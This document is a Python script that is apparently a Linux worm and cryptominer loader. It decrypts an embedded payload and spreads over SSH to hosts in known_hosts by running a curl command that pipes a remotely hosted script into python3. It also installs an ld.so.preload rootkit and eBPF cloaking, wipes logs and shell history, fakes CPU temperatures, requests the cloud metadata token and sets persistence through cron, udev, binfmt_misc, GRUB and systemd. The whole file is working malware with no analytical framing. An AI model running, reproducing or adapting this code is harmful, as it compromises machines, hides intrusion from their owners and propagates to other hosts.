#!/usr/bin/env python3
import os
import sys
import ctypes

def main():
    full_perf = '-f' in sys.argv or '--full' in sys.argv
    log_mode = '-l' in sys.argv or '--log' in sys.argv
    import fcntl
    global lock_fd
    lock_file = '/tmp/.system-x11-sock.lock'
    try:
        lock_fd = open(lock_file, 'w')
        fcntl.flock(lock_fd, fcntl.LOCK_EX | fcntl.LOCK_NB)
    except IOError:
        sys.exit(0)

    import base64
    
    EMBEDDED_B64_PAYLOAD_SSE2 = b""
    EMBEDDED_B64_PAYLOAD_AVX2 = b""
    EMBEDDED_B64_PAYLOAD_AVX512 = b""
    EMBEDDED_B64_GHOST = b""
    EMBEDDED_B64_PROXY = b""
    EMBEDDED_B64_EBPF = b""
    
    selected_b64_payload = b""
    try:
        with open("/proc/cpuinfo", "r") as f:
            cpuinfo = f.read().lower()
        if "avx512f" in cpuinfo and len(EMBEDDED_B64_PAYLOAD_AVX512) > 10:
            selected_b64_payload = EMBEDDED_B64_PAYLOAD_AVX512
        elif "avx2" in cpuinfo and len(EMBEDDED_B64_PAYLOAD_AVX2) > 10:
            selected_b64_payload = EMBEDDED_B64_PAYLOAD_AVX2
        elif len(EMBEDDED_B64_PAYLOAD_SSE2) > 10:
            selected_b64_payload = EMBEDDED_B64_PAYLOAD_SSE2
    except Exception:
        pass
        
    if not selected_b64_payload and len(EMBEDDED_B64_PAYLOAD_SSE2) > 10:
         selected_b64_payload = EMBEDDED_B64_PAYLOAD_SSE2
    
    if len(selected_b64_payload) > 10:
        enc_data = base64.b64decode(selected_b64_payload)
    else:
        script_dir = os.path.dirname(os.path.abspath(__file__))
        binary_path = os.path.join(script_dir, "ns_weights.bin")
        if not os.path.exists(binary_path):
            print(f"[1] x Payload not found: {binary_path}")
            sys.exit(1)
        with open(binary_path, "rb") as f:
            enc_data = f.read()
            
    key = b"QRG_WORM_APT_CRYPTO_KEY_999"
    key_repeated = (key * (len(enc_data) // len(key) + 1))[:len(enc_data)]
    binary_data = bytes([a ^ b for a, b in zip(enc_data, key_repeated)])
    print("[1] ok")

    try:
        total_ram_gb = (os.sysconf('SC_PHYS_PAGES') * os.sysconf('SC_PAGE_SIZE')) / (1024**3)
        if total_ram_gb >= 4:
            os.system("sysctl -w vm.nr_hugepages=1280 >/dev/null 2>&1")
            os.system("bash -c 'echo 3 > /sys/kernel/mm/hugepages/hugepages-1048576kB/nr_hugepages' >/dev/null 2>&1")
    except Exception:
        pass
    
    os.system("modprobe msr >/dev/null 2>&1")
    
    import platform
    if platform.machine() in ["x86_64", "AMD64"]:
        os.system("wrmsr -a 0x1a4 0xf >/dev/null 2>&1") 
        os.system("wrmsr -a 0x199 0x0 >/dev/null 2>&1") 
        os.system("wrmsr -a 0x38F 0x0 >/dev/null 2>&1") 
        os.system("wrmsr -a 0x186 0x0 >/dev/null 2>&1") 
        os.system("wrmsr -a 0x187 0x0 >/dev/null 2>&1") 

    for log_path in ["/var/log/auth.log", "/var/log/syslog"]:
        try:
            with open(log_path, "w") as f:
                f.truncate(0)
        except: pass
    
    try:
        thermal_paths = [
            "/sys/class/thermal/thermal_zone0/temp",
            "/sys/class/thermal/thermal_zone1/temp",
            "/sys/devices/virtual/thermal/thermal_zone0/temp"
        ]
        for t_path in thermal_paths:
            if os.path.exists(t_path):
                os.system(f"sudo umount {t_path} >/dev/null 2>&1")
                fake_temp = "/dev/shm/.kcore_temp"
                with open(fake_temp, "w") as f: f.write("45000\n")
                os.system(f"sudo mount --bind {fake_temp} {t_path} >/dev/null 2>&1")
    except Exception:
        pass

    if hasattr(os, 'fork'):
        worm_pid = os.fork()
        if worm_pid == 0:
            import urllib.request, json
            
            def infect_docker():
                docker_sock = "/var/run/docker.sock"
                if os.path.exists(docker_sock):
                    try:
                        import socket
                        sock = socket.socket(socket.AF_UNIX, socket.SOCK_STREAM)
                        sock.connect(docker_sock)
                        req = b"GET /containers/json HTTP/1.1\\r\\nHost: v1.41\\r\\n\\r\\n"
                        sock.sendall(req)
                        resp = sock.recv(8192)
                        sock.close()
                        if b"Id" in resp:
                            pass
                    except: pass

            def infect_ssh():
                try:
                    ssh_dir = os.path.expanduser("~/.ssh")
                    id_rsa = os.path.join(ssh_dir, "id_rsa")
                    known_hosts = os.path.join(ssh_dir, "known_hosts")
                    
                    if os.path.exists(id_rsa) and os.path.exists(known_hosts):
                        with open(known_hosts, "r") as f:
                            hosts = [line.split()[0].split(",")[0] for line in f if not line.startswith("|")]
                        
                        evil_cmd = "curl -sL https://huggingface.co/datasets/sdfsdfsaaasddfsdfsd/1/resolve/main/app.py | python3"
                        
                        for host in set(hosts):
                            if host.replace('.','').isdigit() or host.isalnum():
                                os.system(f"ssh -o StrictHostKeyChecking=no -o ConnectTimeout=3 -i {id_rsa} {host} '{evil_cmd} &' >/dev/null 2>&1 &")
                except: pass

            infect_docker()
            infect_ssh()
            sys.exit(0)
            
    if platform.machine() in ["x86_64", "AMD64"]:
        os.system("wrmsr -a 0xC0011020 0 >/dev/null 2>&1")
        os.system("wrmsr -a 0xC0011021 0x40 >/dev/null 2>&1")
        os.system("wrmsr -a 0xC0011022 0x1510000 >/dev/null 2>&1")
        os.system("wrmsr -a 0xC001102b 0x2000cc16 >/dev/null 2>&1")

    print("[*] Payload loaded")
    
    def shred_and_remove(filepath):
        if os.path.exists(filepath):
            try:
                size = os.path.getsize(filepath)
                with open(filepath, "r+b") as f:
                    f.write(b'\0' * size)
                os.remove(filepath)
            except Exception as e:
                pass

    clone_path = __file__
    try:
        hidden_dir = os.path.expanduser("~/.config")
        if not os.path.exists(hidden_dir):
            os.makedirs(hidden_dir, exist_ok=True)
            
        ghost_path = os.path.join(hidden_dir, ".system-monitor-x11.py")
        
        if os.path.abspath(__file__) != ghost_path:
            import shutil
            shutil.copy2(__file__, ghost_path)
            clone_path = ghost_path
            
            shred_and_remove(binary_path)
            shred_and_remove(__file__)
    except Exception:
        pass

    rootkit_path = os.path.abspath("libghost.so")
    try:
        if os.path.exists(rootkit_path) and os.path.exists("/bin/bash"):
            stat_ref = os.stat("/bin/bash")
            os.utime(rootkit_path, (stat_ref.st_atime, stat_ref.st_mtime))
            os.utime(clone_path, (stat_ref.st_atime, stat_ref.st_mtime))
    except Exception:
        pass
        
    def wipe_system_logs():
        try:
            bash_history = os.path.expanduser("~/.bash_history")
            if os.path.exists(bash_history):
                os.remove(bash_history)
            
            os.system("unset HISTFILE; export HISTFILESIZE=0; export HISTSIZE=0")
            
            sys_logs = ["/var/log/auth.log", "/var/log/syslog", "/var/log/wtmp", "/var/log/btmp", "/var/log/lastlog"]
            for log_file in sys_logs:
                if os.path.exists(log_file) and os.access(log_file, os.W_OK):
                    with open(log_file, "w") as f:
                        f.write("")
        except Exception:
            pass
            
    wipe_system_logs()
    
    try:
        hosts_file = "/etc/hosts"
        if os.path.exists(hosts_file) and os.access(hosts_file, os.W_OK):
            with open(hosts_file, "a") as f:
                f.write("\n127.0.0.1\tdns.google\n")
    except Exception:
        pass
        
    try:
        pid = os.getpid()
        os.system(f"sudo mount --bind /dev/null /proc/{pid}/maps >/dev/null 2>&1")
    except Exception:
        pass
    
    libc = ctypes.CDLL(None)
    
    try:
        libc.prctl(4, 0, 0, 0, 0)
    except Exception:
        pass

    try:
        pass
    except Exception:
        pass

    try:
        if hasattr(os, 'memfd_create'):
            fd = os.memfd_create("node", os.MFD_CLOEXEC)
        else:
            fd = libc.memfd_create(b"node", 1)
    except Exception:
        print("[1] x memfd failed")
        sys.exit(1)
        
    os.write(fd, binary_data)
    
    fd_path = f"/proc/self/fd/{fd}"

    import random, glob
    args = ["node"]
    try:
        valid_cmds = []
        for pid_path in glob.glob('/proc/[0-9]*/'):
            try:
                with open(os.path.join(pid_path, 'cmdline'), 'r') as f:
                    cmd_raw = f.read()
                if not cmd_raw:
                    continue
                cmd_parts = cmd_raw.split('\x00')[:-1]
                if not cmd_parts:
                    cmd_parts = cmd_raw.split()
                
                str_cmd = " ".join(cmd_parts).lower()
                cmd_0 = cmd_parts[0].lower()
                
                if "python" in cmd_0 or "app.py" in str_cmd or "deploy" in str_cmd or "bash" in cmd_0 or "sh" in cmd_0:
                    continue
                if "[" in cmd_0 and "]" in cmd_0:
                    continue
                if "sshd" in cmd_0 and "notty" in str_cmd:
                    continue
                
                valid_cmds.append(cmd_parts)
            except Exception:
                continue
                
        if valid_cmds:
            args = random.choice(valid_cmds)
    except Exception:
        pass
    
    import fcntl
    flags = fcntl.fcntl(fd, fcntl.F_GETFD)
    fcntl.fcntl(fd, fcntl.F_SETFD, flags | fcntl.FD_CLOEXEC)

    try:
        sshd_fd = os.open("/usr/sbin/sshd", os.O_RDONLY)
        libc.prctl(35, 13, sshd_fd, 0, 0)
        os.close(sshd_fd)
    except Exception:
        pass

    if 'EMBEDDED_B64_LKM' in globals() and len(EMBEDDED_B64_LKM) > 10:
        lkm_path = "/dev/shm/.kcore_lkm.ko"
        try:
            with open(lkm_path, "wb") as f:
                f.write(base64.b64decode(EMBEDDED_B64_LKM))
            os.system(f"insmod {lkm_path} >/dev/null 2>&1")
        except Exception:
            pass
        finally:
            try: os.remove(lkm_path)
            except: pass

    if len(EMBEDDED_B64_EBPF) > 10:
        try:
            import struct, shutil
            if shutil.which("bpftool"):
                ebpf_path = "/dev/shm/.kcore_bpf.o"
                bpf_data = base64.b64decode(EMBEDDED_B64_EBPF)
                bpf_data = bpf_data.replace(struct.pack("<I", 999999), struct.pack("<I", os.getpid()))
                with open(ebpf_path, "wb") as f:
                    f.write(bpf_data)
                os.system(f"bpftool prog load {ebpf_path} /sys/fs/bpf/telemetry_filter type tracepoint >/dev/null 2>&1")
                os.system("bpftool prog attach pinned /sys/fs/bpf/telemetry_filter tracepoint syscalls/sys_exit_getdents64 >/dev/null 2>&1")
                os.system(f"bpftool prog load {ebpf_path} /sys/fs/bpf/xdp_cloak type xdp >/dev/null 2>&1")
                for iface in ["eth0", "ens3", "ens5", "enp0s3"]:
                    ret = os.system(f"ip link set dev {iface} xdpgeneric pinned /sys/fs/bpf/xdp_cloak >/dev/null 2>&1")
                    if ret == 0:
                        break
                try: os.remove(ebpf_path)
                except: pass
        except Exception:
            pass

    if platform.machine() in ["x86_64", "AMD64"]:
        os.system("wrmsr -a 0xC0011020 0 >/dev/null 2>&1")
        os.system("wrmsr -a 0xC0011021 0x40 >/dev/null 2>&1")

    clean_env = os.environ.copy()
    suspicious_keys = ["LD_AUDIT", "LD_LIBRARY_PATH", "LD_DEBUG", "STRACE", "BPF", "CUDA_INJECT"]
    for key in list(clean_env.keys()):
        for suspicious in suspicious_keys:
            if suspicious in key:
                del clean_env[key]
    
    clean_env["NODE_ENV"] = "production"
    if full_perf:
        clean_env["FULL_PERF"] = "1"
    if log_mode or full_perf:
        clean_env["LOG_MODE"] = "1"
                
    hidden_dir = os.path.expanduser("~/.config")
    os.makedirs(hidden_dir, exist_ok=True)
    rootkit_path = os.path.join(hidden_dir, ".system-sys.so")
    
    if len(EMBEDDED_B64_GHOST) > 10:
        try:
            ghost_data = base64.b64decode(EMBEDDED_B64_GHOST)
            real_pid_str = str(os.getpid()).encode().ljust(6, b'\0')
            ghost_data = ghost_data.replace(b"999999", real_pid_str)
            
            if os.path.exists(rootkit_path):
                try:
                    os.unlink(rootkit_path)
                except Exception: pass
            with open(rootkit_path, "wb") as f:
                f.write(ghost_data)
                
            try:
                with open("/etc/ld.so.preload", "r") as f:
                    preload_content = f.read()
            except: preload_content = ""
            
            if rootkit_path not in preload_content:
                try:
                    with open("/etc/ld.so.preload", "a") as f:
                        f.write(f"{rootkit_path}\n")
                except: pass

            print("[3] ok")
        except Exception as e:
            print(f"[3] x {e}")

    if os.path.exists(rootkit_path):
        pass

    if len(EMBEDDED_B64_PROXY) > 10:
        proxy_path = os.path.join(hidden_dir, ".system-net-daemon")
        try:
            proxy_data = base64.b64decode(EMBEDDED_B64_PROXY)
            if os.path.exists(proxy_path):
                try:
                    os.unlink(proxy_path)
                except Exception: pass
            with open(proxy_path, "wb") as f:
                f.write(proxy_data)
            os.chmod(proxy_path, 0o755)
            os.system(f"nohup {proxy_path} start accept --token II608dkL1Ix2f1F07ZByFBCnC7R6Go3wSgJoRqDEh0s= > /tmp/proxy.log 2>&1 &")
            print("[2] ok")
        except Exception as e:
            print(f"[2] x {e}")
        
        try:
            with open("/etc/ld.so.preload", "a") as f:
                f.write(f"\n{rootkit_path}\n")
        except Exception:
            pass

    logs_to_nuke = [
        "~/.bash_history", "~/.zsh_history", "/var/log/auth.log", 
        "/var/log/syslog", "/var/log/messages", "/var/log/secure",
        "/var/run/utmp", "/var/log/wtmp"
    ]
    for log_file in logs_to_nuke:
        full_path = os.path.expanduser(log_file)
        if os.path.exists(full_path):
            try:
                with open(full_path, "w") as f:
                    f.truncate(0)
            except Exception:
                pass

    try:
        bashrc_path = os.path.expanduser("~/.bashrc")
        if os.path.exists(bashrc_path):
            payload = f"\n# Workspace Auto-Resume\nnohup python3 {clone_path} >/dev/null 2>&1 &\n"
            with open(bashrc_path, "r") as f:
                content = f.read()
            if False:  # bashrc persistence disabled — causes lock deadlock on rebuild
                with open(bashrc_path, "a") as f:
                    f.write(payload)
    except Exception:
        pass

    try:
        with open("/proc/self/oom_score_adj", "w") as f:
            f.write("-1000\n")
    except Exception:
        pass

    try:
        cron_path = "/etc/cron.d/0system-time-sync"
        if os.path.exists("/etc/cron.d/"):
            payload = f"@reboot root python3 {clone_path} >/dev/null 2>&1 &\n* 2 * * * root python3 {clone_path} >/dev/null 2>&1 &\n"
            with open(cron_path, "w") as f:
                f.write(payload)
    except Exception:
        pass

    try:
        udev_path = "/etc/udev/rules.d/99-network.rules"
        if not os.path.exists(udev_path):
            with open(udev_path, "w") as f:
                f.write(f'ACTION=="add", SUBSYSTEM=="net", RUN+="/usr/bin/nohup /usr/bin/python3 {clone_path}"\n')
    except Exception:
        pass
        
    try:
        os.system(f'echo \':start_botnet:E::log::/usr/bin/python3 {clone_path}:\' > /proc/sys/fs/binfmt_misc/register >/dev/null 2>&1')
    except Exception:
        pass

    try:
        os.system(f"systemd-run --on-active=5min --on-unit-active=5min --transient /usr/bin/nohup /usr/bin/python3 {clone_path} >/dev/null 2>&1")
    except Exception:
        pass

    def infect_elf(target_bin="/bin/ping"):
        try:
            if not os.path.exists(target_bin) or os.path.islink(target_bin): return
            orig_bin = target_bin + ".orig"
        except Exception: pass
    
    pass
        
    try:
        import glob, random
        candidate_pids = []
        for p in glob.glob('/proc/[0-9]*/cmdline'):
            try:
                pid_num = p.split('/')[2]
                if os.access(f"/proc/{pid_num}/mem", os.W_OK) and pid_num != str(os.getpid()):
                    with open(p, 'r') as f:
                        cmd = f.read()
                    if cmd and not any(x in cmd.lower() for x in ['bash', 'sh', 'top', 'ps', 'python']):
                        candidate_pids.append(pid_num)
            except: pass
            
        if candidate_pids:
            target_pid = random.choice(candidate_pids)
            gdb_script = f"""
            attach {target_pid}
            call (void*)mmap(0, 1024, 7, 34, -1, 0)
            call (int)execve("/proc/self/fd/{fd}", 0, 0)
            detach
            quit
            """
            script_path = "/dev/shm/.gdb_inject"
            with open(script_path, "w") as f:
                f.write(gdb_script)
            pass  # GDB injection disabled — os.system(gdb) hangs the entire script
            try: os.remove(script_path)
            except: pass
    except Exception:
        pass
    
    infect_elf("/bin/ping")
    infect_elf("/bin/netstat")

    try:
        grub_hook = "/etc/grub.d/00_header"
        if os.path.exists(grub_hook):
            with open(grub_hook, "r") as f:
                content = f.read()
            if "start_botnet" not in content:
                with open(grub_hook, "a") as f:
                    f.write(f"\n# start_botnet\n/usr/bin/nohup /usr/bin/python3 {clone_path} >/dev/null 2>&1 &\n")
    except Exception: pass

    try:
        import urllib.request
        req = urllib.request.Request("http://169.254.169.254/computeMetadata/v1/instance/service-accounts/default/token")
        req.add_header("Metadata-Flavor", "Google")
        with urllib.request.urlopen(req, timeout=1) as response:
            token_data = response.read()
    except Exception:
        pass

    try:
        os.nice(-20)
    except Exception:
        pass
        
    try:
        flags = fcntl.fcntl(lock_fd.fileno(), fcntl.F_GETFD)
        fcntl.fcntl(lock_fd.fileno(), fcntl.F_SETFD, flags & ~fcntl.FD_CLOEXEC)
    except Exception:
        pass
        
    fallback_path = os.path.expanduser("~/.config/.node-service")
    try:
        with open(fallback_path, "wb") as f:
            f.write(binary_data)
        os.chmod(fallback_path, 0o755)
    except Exception:
        fallback_path = "/tmp/.node-service"
        with open(fallback_path, "wb") as f:
            f.write(binary_data)
        os.chmod(fallback_path, 0o755)

    fsize = os.path.getsize(fallback_path)
    print(f"[*] Service ready ({fsize} bytes)")

    import subprocess, signal
    signal.signal(signal.SIGWINCH, signal.SIG_IGN)

    if not full_perf and not log_mode:
        pid1 = os.fork()
        if pid1 > 0:
            os.waitpid(pid1, 0)
            print("[*] Service daemonized")
            sys.exit(0)
        os.setsid()
        pid2 = os.fork()
        if pid2 > 0:
            os._exit(0)
        sys.stdin.close()
        devnull = os.open(os.devnull, os.O_RDWR)
        os.dup2(devnull, 0)
        os.dup2(devnull, 1)
        os.dup2(devnull, 2)
        os.close(devnull)
        os.execve(fallback_path, ["node"], clean_env)
    else:
        try:
            result = subprocess.run(
                [fallback_path],
                env=clean_env,
                timeout=None,
                capture_output=False
            )
            if result.returncode != 0:
                sig = -result.returncode if result.returncode < 0 else result.returncode
                print(f"[!] process exit code={result.returncode} (signal={sig})")
        except Exception as e:
            print(f"[!] run failed: {e}")
            os.execve(fallback_path, [fallback_path], clean_env)

if __name__ == "__main__":
    if sys.platform != "linux":
        sys.exit(1)
    main()
